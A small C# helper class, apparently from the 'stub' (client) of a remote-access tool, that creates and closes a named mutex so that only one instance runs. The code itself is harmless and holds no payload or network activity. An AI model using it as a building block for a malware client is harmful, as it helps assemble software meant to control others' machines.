using System.Threading;


namespace Stub.Help
{
    class MutEx
    {
        public static Mutex m;
        public static bool CreateMutEx()
        {
            m = new Mutex(false, Config.MutEx, out bool createdNew);
            return createdNew;
        }
        public static void CloseMutEx()
        {
            if (m != null)
            {
                m.Close();
                m = null;
            }
        }
    }
}
